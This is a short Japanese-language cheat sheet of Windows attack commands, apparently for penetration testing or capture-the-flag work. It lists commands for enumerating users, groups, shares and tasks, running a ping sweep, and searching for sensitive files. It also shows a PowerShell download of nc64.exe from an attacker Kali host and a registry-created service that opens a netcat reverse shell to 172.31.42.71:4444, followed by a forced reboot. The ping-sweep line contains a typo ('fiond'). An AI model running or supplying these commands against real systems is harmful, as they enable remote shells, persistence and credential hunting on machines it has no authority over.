# windows command

* net XXX

``` bat
    # ユーザ情報
    net user
    または
    wmic USERACCOUNT Get Domain,Name,Sid
    # ログオンとかパスワード条件とか
    net accounts
    # ローカルグループ情報
    net localgroup
```

* tasklist

``` bat
    tasklist /SVC
```

* schtasks

```bat
    # /S: 接続先リモートシステム
    # /U: ユーザ名
    # /P: パスワード
    # /TN: タスク名
    # /SC: スケジュール(1回) 
    # /SD: 開始日
    # /ST: 開始時刻
    # /TR: 実行タスク
    schtasks /Create /S 192.168.xxx.xxx /U <user> /P <password> /TN sample /SC ONCE /SD 1900/01/01 /ST 00:00 /TR C:¥Remote¥test.bat

    # タスクの一覧表示
    schtasks /query /fo list 
```

* システム情報

```bat
    systeminfo
    または
    wmic computersystem LIST full
```

* マウント情報(共有ドライブとか)

``` bat
    mountvol
    共有ドライブ
    powershell -Command "Get-WmiObject -class Win32_Share"
```

* ping sweep

``` bat
    for /l %i in (1,1,255) do @ping -n 1 -w 100 XXX.XXX.XXX.%i | fiond "TTL="
```

* ファイル検索

``` bat
    dir /s *<file_name>*
    または
    wmic DATAFILE where "drive='C:' AND Name like '%<file_name>%'" GET Name,Readable,size /VALUE

    # 検索でよく使うファイルパターン
    *.txt/*.doc/*.xls/*.one/*.cnf/unattend.xml
```

* ファイル転送

``` powershell
    powershell -NoProfile -ExecutionPolicy unrestricted -Command (Invoke-WebRequest -Uri "http://<Remote KaliのIP>:8000/nc64.exe" -OutFile "nc64.exe")
```

* kaliにあるwindowsで実行可能なファイル
  
    `/usr/share/windows-binaries`

* windows reverse shell
  * windowsサービス

``` bat
    #wordpressから[nc.exe]をfile uploadする必要がある。
    reg add HKLM\SYSTEM\CurrentControlSet\Services\evilsvc /t REG_EXPAND_SZ /v ImagePath /d "cmd /c \"C:\inetpub\wwwroot\wordpress\wp-content\themes\twentytwenty\nc.exe 172.31.42.71 4444 -e cmd\"" /f

    #再起動できる場合は再起動
    shutdown /r /t 0
```

* サービス登録

``` batch
    # サービス登録コマンド
    # notepad.exeをシステム起動時に自動起動するサービスを登録するコマンド 
    sc create notepad binpath= "C:¥Windows¥system32¥notepad.exe" start=auto
    # 
    sc qc evilsvc
```
